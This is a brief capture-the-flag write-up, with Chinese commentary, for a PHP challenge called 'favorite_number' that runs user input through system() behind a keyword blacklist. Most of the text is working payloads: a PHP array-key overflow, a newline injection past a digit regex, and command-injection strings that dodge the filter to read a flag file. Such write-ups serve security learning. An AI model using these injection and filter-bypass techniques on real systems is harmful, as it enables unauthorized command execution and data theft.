# favorite_number

```php
<?php
//php5.5.9
$stuff = $_POST["stuff"];
$array = ['admin', 'user'];
if($stuff === $array && $stuff[0] != 'admin') {
    $num= $_POST["num"];
    if (preg_match("/^\d+$/im",$num)){
        if (!preg_match("/sh|wget|nc|python|php|perl|\?|flag|}|cat|echo|\*|\^|\]|\\\\|'|\"|\|/i",$num)){
            echo "my favorite num is:";
            system("echo ".$num);
        }else{
            echo 'Bonjour!';
        }
    }
} else {
    highlight_file(__FILE__);
}
```

绕过 `if($stuff === $array && $stuff[0] != 'admin')`:

```
stuff[4294967296]=admin&stuff[1]=user   PHP数组的key溢出问题.
```

绕过 `if (preg_match("/^\d+$/im",$num))`:

```
num=123%0a
```

绕过 `if (!preg_match("/sh|wget|nc|python|php|perl|\?|flag|}|cat|echo|\*|\^|\]|\\\\|'|\"|\|/i",$num))`:

找到 `flag` 在:

```
stuff[4294967296]=admin&stuff[1]=user&num=123%0als+-a+../../../../
```

一些 payload:

```
stuff[4294967296]=admin&stuff[1]=user&num=123%0aca``t+../../../../fla``g
stuff[4294967296]=admin&stuff[1]=user&num=123%0atac+../../../../fla$1g
stuff[4294967296]=admin&stuff[1]=user&num=123%0atac+../../../../fla$@g
```

```
stuff[4294967296]=admin&stuff[1]=user&num=123%0aprintf+../../../../fla+>>+../../../../tmp/payload.txt
stuff[4294967296]=admin&stuff[1]=user&num=123%0aprintf+g+>>+../../../../tmp/payload.txt
stuff[4294967296]=admin&stuff[1]=user&num=123%0atac+`tac+../../../../tmp/payload.txt`
```

```
stuff[4294967296]=admin&stuff[1]=user&num=123%0als+-i+../../../../
stuff[4294967296]=admin&stuff[1]=user&num=123%0atac+`find+/+-inum+36047176`
```

```
stuff[4294967296]=admin&stuff[1]=user&num=123%0aa=fla;b=g;tac+/$a$b
```
